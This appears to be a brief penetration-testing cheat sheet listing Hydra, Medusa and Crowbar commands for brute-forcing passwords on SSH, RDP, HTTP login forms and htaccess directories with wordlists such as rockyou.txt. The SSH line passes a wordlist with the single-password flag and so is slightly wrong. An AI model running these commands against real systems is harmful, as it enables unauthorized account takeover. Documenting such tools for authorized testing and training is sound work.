# Bruteforce
Hera are some basic ways to do it. 
## Hydra
* SSH: sudo hydra -l user -p /path/of/wordlist.txt -s PORT ssh://IP
* RDP: sudo hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://IP -> Bruteforce usernames it'll depends about logic if you need the password then put there the wordlist
* HTTP Login Form: sudo hydra -l user -P /usr/share/wordlists/rockyou.txt IP http-post-form "/*index.php*:*fm_usr*=user&*fm_pwd*=^PASS^:*Login failed. Invalid*" -> Here you have to change the parameters and the error message.

## Medusa
* HTTP htaccess: medusa -h IP -u user -P /path/of/wordlist.txt -M http -m DIR:/admin

## Crowbar
* RDP: crowbar -b rdp -s 10.11.0.22/32 -u admin -C /path/of/worlist.txt -n 1 
